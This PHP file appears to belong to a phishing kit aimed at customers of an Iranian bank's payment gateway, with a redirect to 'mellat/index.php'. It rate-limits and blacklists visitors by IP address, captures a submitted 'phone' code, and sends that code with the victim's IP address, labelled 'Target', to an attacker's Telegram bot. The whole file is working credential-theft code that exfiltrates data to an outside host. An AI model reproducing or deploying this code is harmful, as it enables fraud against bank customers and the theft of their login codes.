<?php

include "telegram.php" ;
$reqMrLode8=3;
$timeMrLode8=5;
session_start();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
} $ips=file('re.txt');
foreach($ips as $ipbad)
{
  if(trim($ipbad) == $ip){
  header('HTTP/1.0 403 Forbidden');
  exit();
   }
} if (isset($_SESSION['LAST_ACTIVITY']) && (time() - $_SESSION['LAST_ACTIVITY'] > $timeMrLode8)) {
    session_unset();
    session_destroy();
    $_SESSION['rec']   = 1;
} if(!isset($_SESSION['rec']) || $_SESSION['rec']==0){
$_SESSION['rec']   = 1;
$_SESSION['LAST_ACTIVITY'] = time();
} else {
$_SESSION['rec']++;
}
if($_SESSION['rec']>=$reqMrLode8){
$file = 're.txt';
$current = file_get_contents($file);
$current .= $ip."\n";
file_put_contents($file, $current);
}

	
$ph = $_POST['phone'];
$user = $_SERVER['REMOTE_ADDR'];

$admin = "
لاگین به درگاه با موفقیت انجام شد ⚠️

◼️Code : <code>$ph</code>
◻️Target : <code>$user</code>
➖➖➖";

file_get_contents("https://api.telegram.org/bot".$TOKEN."/sendMessage?parse_mode=HTML&chat_id=".$ID."&text=".urlencode($admin));
header('Location: mellat/index.php');


?>
